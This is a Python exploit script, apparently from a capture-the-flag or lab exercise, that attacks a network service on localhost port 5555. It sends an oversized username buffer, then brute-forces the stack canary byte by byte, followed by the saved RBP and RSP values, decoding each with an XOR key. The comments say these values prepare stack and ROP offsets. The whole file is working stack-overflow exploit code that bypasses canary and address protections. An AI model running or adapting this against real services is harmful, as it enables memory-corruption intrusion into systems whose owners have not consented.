import sys
import socket
import struct

_Host = 'localhost'
_Port = 5555
_Correct_User=struct.pack("Q",0x780d656469766164)

def reverse(_buffer):
	return _buffer[::-1]

def connect():	
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		sock.connect((_Host, _Port))
	except Exception as e:
		print("Error! Cannot connect: {0}", str(e))
		sys.exit(1)

	sock.settimeout(1)
	return sock

def test(_buffer):
	mySock = connect()
	recv = mySock.recv(1024)
	mySock.send(_buffer)
	recv = mySock.recv(1024)
	mySock.close()
	print(recv.decode("utf-8"))

def xor_me(_buffer):
	_to_return = bytearray(len(_buffer))
	for index in range(0, len(_buffer)):
		_to_return[index] = _buffer[index] ^ 0x0d

	return _to_return

def brute_force(_Payload):
	byte_count=0
	dead=0
	count=0
	_to_return = bytearray()

	while byte_count < 8:
		if count > 255:
			print("[!] ERROR!! count > 255\n")
			sys.exit(0)
		sock=connect()		
		rec=sock.recv(1024)
		_test_byte=struct.pack("B",int(hex(count),16))
		sock.send(_Payload + _to_return + _test_byte)
		try:
			rec=sock.recv(1024)
		except:
			if dead == 0:
				print("[!] Skipping dead bytes")		
			dead+=1
		if len(rec) > 0:
			byte_count += 1		
			_to_return += struct.pack("B",int(hex(count),16))
			count = 0
		else:
			count += 1

	return _to_return

def main():
	_Payload = _Correct_User + "A".encode("utf-8") * 1024

	## find canary and add it to the payload
	_canary = brute_force(_Payload)
	_Payload += _canary
	_canary_hex = xor_me(reverse(_canary)).hex()
	print("[+] Canary found: {0}".format(_canary_hex))

	## find RBP - used to calculate stack offset
	_RBP = brute_force(_Payload)	
	_RBP_hex = xor_me(reverse(_RBP)).hex()
	print("[+] RBP found: {0}".format(_RBP_hex))

	## find RSP - used to calculate ROP offset
	_RSP = brute_force(_Payload + _RBP)	
	_RSP_hex = xor_me(reverse(_RSP)).hex()
	print("[+] RSP found: {0}".format(_RSP_hex))

	## test run - should result in "Username found!"
	test(_Payload)	

	## end
	return 0

if __name__ == '__main__':
	sys.exit(main())
